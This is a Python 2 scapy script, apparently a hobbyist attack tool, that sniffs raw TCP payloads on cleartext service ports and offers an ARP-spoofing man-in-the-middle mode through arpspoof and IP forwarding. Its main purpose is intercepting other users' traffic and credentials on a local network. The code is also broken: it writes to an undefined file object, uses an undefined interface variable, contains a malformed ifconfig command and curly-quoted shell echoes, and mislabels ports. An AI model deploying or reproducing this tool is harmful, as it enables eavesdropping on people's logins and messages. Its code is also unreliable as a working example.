#!/usr/bin/env python
#coding: utf-8
from scapy.all import *
from scapy.error import Scapy_Exception

__AUTHOR__	= "s0ph0s"

def Ban():
	os.system("clear")
	print """\033[1;36m 
  ██████  ███▄    █  ▒█████   █     █░
▒██    ▒  ██ ▀█   █ ▒██▒  ██▒▓█░ █ ░█░
░ ▓██▄   ▓██  ▀█ ██▒▒██░  ██▒▒█░ █ ░█ 
  ▒   ██▒▓██▒  ▐▌██▒▒██   ██░░█░ █ ░█ 
▒██████▒▒▒██░   ▓██░░ ████▓▒░░░██▒██▓ 
▒ ▒▓▒ ▒ ░░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▓░▒ ▒  
░ ░▒  ░ ░░ ░░   ░ ▒░  ░ ▒ ▒░   ▒ ░ ░  
░  ░  ░     ░   ░ ░ ░ ░ ░ ▒    ░   ░  
      ░           ░     ░ ░      ░  
	\033[1;m"""
	
def Men():
	Ban()
	print "\033[1;34m Select from Menu: \n\n[1] Capture all packets \n[2] Filter packets/protocol\n[3] MiTM ON/OF\n\n[0] Exit\n\033[1;m"
	op = raw_input ("\033[1;34mSelect> \033[1;m") 
	Snin0w(op)

def Snin0w(op):
	if op == "1":
		net_interface = raw_input ("\033[1;34mInsert your network interface: \033[1;m")
		fil = open("sniffer_output.cap", "a") # creating log file
		os.system("ifconfig %s promisc"%(net_interface)) # promisc mode

		def s0ph0s_TCP(snin):
        		if snin.haslayer(TCP) and snin.haslayer(Raw): # all services          
                		print snin.getlayer(Raw).load
				fil.write("%s \r\n" % snin.getlayer(Raw))
		sniff(iface=net_interface, prn=s0ph0s_TCP, store=0) # store = 0; not allocate in memory 
		fil.close()
		os.system("eth0 %s -promisc" %(net_interface)) 


	elif op == "2":
		os.system("clear")
		Ban()
		print "\033[1;34m Select from Menu: \n\n[1] Listen Port \n[2] Listen Protocol\n\n[0] Back\n\033[1;m"
		op_1 = raw_input ("\033[1;34mSelect> \033[1;m")
		if op_1 == "1":
			net_interface = raw_input ("\033[1;34mInsert your network interface: \033[1;m")
			filter_message = raw_input("\033[1;34mInsert Port: \033[1;m")
			fil = open("sniffer_output.cap", "a") # creat log file
			os.system("ifconfig %s promisc"%(net_interface))

			def s0ph0s_TCP(snin):
				if filter_message == "21":
				 	if snin.haslayer(TCP) and snin.getlayer(TCP).dport == 21 and snin.haslayer(Raw): # FTP
				  		print snin.getlayer(Raw).load
						arquivo.write("%s \r\n" % snin.getlayer(Raw))
				if filter_message == "22":
					if snin.haslayer(TCP) and snin.getlayer(TCP).dport == 22 and snin.haslayer(Raw): # SSH
						print snin.getlayer(Raw).load
						arquivo.write("%s \r\n" % snin.getlayer(Raw))
				if filter_message == "23":
					if snin.haslayer(TCP) and snin.getlayer(TCP).dport == 23 and snin.haslayer(Raw): # TELNET 
					      	print snin.getlayer(Raw).load
						arquivo.write("%s \r\n" % snin.getlayer(Raw))
				if filter_message == "25":
					if snin.haslayer(TCP) and snin.getlayer(TCP).dport == 25 and snin.haslayer(Raw): # SMTP         
						print snin.getlayer(Raw).load
						arquivo.write("%s \r\n" % snin.getlayer(Raw))
				if filter_message == "80":	
					if snin.haslayer(TCP) and snin.getlayer(TCP).dport == 80 and snin.haslayer(Raw): # HTTP         
				       		print snin.getlayer(Raw).load
						arquivo.write("%s \r\n" % snin.getlayer(Raw))
				if filter_message == "110":
					if snin.haslayer(TCP) and snin.getlayer(TCP).dport == 110 and snin.haslayer(Raw): # POP3        
						print snin.getlayer(Raw).load
						arquivo.write("%s \r\n" % snin.getlayer(Raw))
				if filter_message == "143":	
					if snin.haslayer(TCP) and snin.getlayer(TCP).dport == 143 and snin.haslayer(Raw): # IMAP       
						print snin.getlayer(Raw).load
						arquivo.write("%s \r\n" % snin.getlayer(Raw))
				if filter_message == "133":
					if snin.haslayer(TCP) and snin.getlayer(TCP).dport == 133 and snin.haslayer(Raw): # IRC       
						print snin.getlayer(Raw).load
						arquivo.write("%s \r\n" % snin.getlayer(Raw))
				if filter_message == "161":
					if snin.haslayer(TCP) and snin.getlayer(TCP).dport == 161 and snin.haslayer(Raw): # SNMP
						print snin.getlayer(Raw).load
						arquivo.write("%s \r\n" % snin.getlayer(Raw))
				if filter_message == "194":
					if snin.haslayer(TCP) and snin.getlayer(TCP).dport == 194 and snin.haslayer(Raw): # IRC       
				       		print snin.getlayer(Raw).load
						arquivo.write("%s \r\n" % snin.getlayer(Raw))
				if filter_message == "513":
					if snin.haslayer(TCP) and snin.getlayer(TCP).dport == 513 and snin.haslayer(Raw): # RLOGIN     
				       		print snin.getlayer(Raw).load
						arquivo.write("%s \r\n" % snin.getlayer(Raw))
				if filter_message == "119":
					if snin.haslayer(TCP) and snin.getlayer(TCP).dport == 119 and snin.haslayer(Raw): # NNTP 
				       		print snin.getlayer(Raw).load
						arquivo.write("%s \r\n" % snin.getlayer(Raw))
			sniff(iface=net_interface, prn=s0ph0s_TCP, store=0) # store = 0 -> not allocate in memory
			fil.close()
			os.system("ifconfig %s -promisc" %(net_interface))
		
		elif op_1 == "2":
			net_interface = raw_input ("\033[1;34mInsert your network interface: \033[1;m")
			filter_message=raw_input("\033[1;34mInsert Protocol: \033[1;m")
			fil = open("sniffer_output.cap", "a") # creat log file
			os.system("ifconfig %s promisc"%(net_interface))
			def s0ph0s_TCP(snin):
				if snin.haslayer(TCP) and snin.getlayer(TCP).dport == filter_message and snin.haslayer(Raw):        
					print snin.getlayer(Raw).load
					arquivo.write("%s \r\n" % snin.getlayer(Raw))
			sniff(iface=net_interface, prn=s0ph0s_TCP, store=0) # store = 0 -> not allocate in memory
			fil.close()
			os.system("ifconfig %s -promisc" %(net_interface))
			
 		elif op_1 == "0":
			op = Men()
			Snin0w(op)
	
	elif  op == "3":
		os.system("clear")
		print "\033[1;34m Select from Menu: \n\n[1] ON MiTM \n[2] OFF MiTM\n\n[0] Back \n\033[1;m"
		op_3 = raw_input ("\033[1;34mSelect> \033[1;m")
		if op_3 == "1":
			os.system("echo “1” > /proc/sys/net/ipv4/ip_forward")
			ip = raw_input ("\033[1;34mInsert your IP address: \033[1;m")
			gw = raw_input ("\033[1;34mInsert your fake gateway: \033[1;m")
			os.system("arpspoof -i %s -t %s %s" %(net_interface,ip,gw))
		elif op_3 == "2":
			os.system("echo “0” > /proc/sys/net/ipv4/ip_forward")
		elif op_3 == "0":
			Men()
			

	elif  op == "0":	
		os.system("exit")
			
try:
        Men()
except KeyboardInterrupt:
        print "\033[1;34m \n\nFinishing...\nBye :) \033[1;m"

      



